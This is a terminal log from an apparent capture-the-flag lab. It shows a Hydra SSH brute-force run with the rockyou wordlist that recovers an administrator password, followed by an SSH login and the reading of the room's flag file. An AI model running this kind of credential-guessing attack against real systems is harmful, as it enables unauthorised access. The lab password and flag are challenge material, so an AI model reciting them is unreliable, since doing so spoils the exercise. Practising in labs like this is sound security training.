@@ -1,0 +1,78 @@
+┌──(doc730㉿kali)-[~]
+└─$ hydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt -f -v 10.10.174.31 ssh
+
+-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-21 22:50:13
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://10.10.174.31:22/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://administrator@10.10.174.31:22
+[INFO] Successful, password authentication is supported by ssh://10.10.174.31:22
+[STATUS] 84.00 tries/min, 84 tries in 00:01h, 14344315 to do in 2846:06h, 4 active
+[22][ssh] host: 10.10.174.31   login: administrator   password: alejandro
+[STATUS] attack finished for 10.10.174.31 (valid pair found)
+1f 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-21 22:52:17
+                                                                                    
+                                                                                    ______________________________________________________________________________________________
+
+
+
+                                                                                
+┌──(doc730㉿kali)-[~]
+└─$ ssh administrator@10.10.174.31   
+-The authenticity of host '10.10.174.31 (10.10.174.31)' can't be established.
+ED25519 key fingerprint is SHA256:6VV0TI4MQmKeRImOTQ8lj3uk863uVqWS+zh2fF2LLF8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.174.31' (ED25519) to the list of known hosts.
+administrator@10.10.174.31's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Dec 21 06:52:45 UTC 2024
+
+  System load:  0.0               Processes:           91
+  Usage of /:   43.9% of 9.78GB   Users logged in:     0
+  Memory usage: 36%               IP address for eth0: 10.10.174.31
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+87 packages can be updated.
+35 updates are security updates.
+
+
+Last login: Wed Apr 22 22:21:42 2020 from 192.168.1.110
+administrator@polosmtp:~$ ls
+dead.letter  Maildir  smtp.txt
+administrator@polosmtp:~$ ls -a
+.   .bash_history  .bashrc  dead.letter  Maildir   .rnd      .ssh
+..  .bash_logout   .cache   .gnupg       .profile  smtp.txt
+administrator@polosmtp:~$ cat smptp.txt
+cat: smptp.txt: No such file or directory
+administrator@polosmtp:~$ cat smpt.txt
+cat: smpt.txt: No such file or directory
+administrator@polosmtp:~$ cat smtp.txt
+THM{who_knew_email_servers_were_c00l?}
+administrator@polosmtp:~$ ^C
+administrator@polosmtp:~$ cat dead.letter
+From vagrant Wed Apr 22 20:23:34 2020
+Date: Wed, 22 Apr 2020 20:23:34 +0000
+To: vagrant
+Subject: init
+User-Agent: s-nail v14.9.6
+
+init
+
+administrator@polosmtp:~$ exit
+logout
+Connection to 10.10.174.31 closed.
